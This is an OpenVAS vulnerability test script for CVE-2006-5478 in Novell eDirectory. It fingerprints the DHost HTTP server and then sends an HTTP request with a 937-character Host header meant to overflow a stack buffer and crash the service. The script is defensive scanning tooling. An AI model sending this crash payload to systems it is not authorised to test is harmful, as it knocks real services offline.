###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_novell_edirectory_long_http_host_header_bof_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# Novell eDirectory Multiple Stack Based Buffer Overflow Vulnerabilities
#
# Authors:
# Sharath S <sharaths@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow remote attackers to execute arbitrary
  code and deny the server.
  Impact Level: System/Application";
tag_affected = "Novell eDirectory 8.8.x to 8.8.1, and 8.x to 8.7.3.8 (8.7.3 SP8)";
tag_insight = "The flaws are due to improper validation of user-supplied input via
  a long HTTP Host header, which triggers an overflow in the BuildRedirectURL
  function.";
tag_solution = "Upgrade to Novell eDirectory version 8.8.1 FTF1 or 8.7.3.9 (8.7.3 SP9)
  For updates refer to http://www.novell.com/support/kb/doc.php?id=3723994";
tag_summary = "This host is running Novell eDirectory and is prone to multiple
  multiple stack based buffer overflow vulnerabilities.";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.802674";
CPE = "cpe:/a:novell:edirectory";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 12 $");
  script_cve_id("CVE-2006-5478");
  script_bugtraq_id(20655);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-10-08 19:32:57 +0530 (Mon, 08 Oct 2012)");
  script_name("Novell eDirectory Multiple Stack Based Buffer Overflow Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://secunia.com/advisories/22519");
  script_xref(name : "URL" , value : "http://securitytracker.com/id?1017125");
  script_xref(name : "URL" , value : "http://www.zerodayinitiative.com/advisories/ZDI-06-035/");
  script_xref(name : "URL" , value : "http://www.zerodayinitiative.com/advisories/ZDI-06-036/");

  script_description(desc);
  script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
  script_summary("Check for multiple BOF vulnerabilities in Novell eDirectory");
  script_category(ACT_DENIAL);
  script_family("Denial of Service");
  script_dependencies("novell_edirectory_detect.nasl");
  script_require_keys("eDirectory/installed");
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("version_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

## Variables Initialization
sndReq = "";
rcvRes = "";
dosAtk = "";
edirPort = 0;
edirInstall = "";

## Check Novell eDirectory Exists
edirInstall = get_kb_item("eDirectory/installed");
if(!edirInstall){
  exit(0);
}

## Check default port state
edirPort = get_http_port(default:8028);
if (!edirPort){
  edirPort = 8028;
}

# Check port status
if(!get_port_state(edirPort)){
  exit(0);
}

# Get DHost HTTP Server response
sndReq = http_get(item:string("/"), port:edirPort);
rcvRes = http_keepalive_send_recv(port:edirPort, data:sndReq);

# Check DHost HTTP Server
if (!rcvRes || !egrep(pattern:"^Server: DHost\/[0-9\.]+ HttpStk\/[0-9\.]+", string:rcvRes)){
  exit(0);
}

## Send DoS attack
dosAtk = string("GET /nds HTTP/1.1\r\n",
                "Host: ", crap(length:937,data:"A"), "\r\n\r\n");
http_send_recv(port:edirPort, data:dosAtk);

## Check Server is alive or not
if(http_is_dead(port:edirPort, retry:2)) {
  security_hole(edirPort);
  exit(0);
}
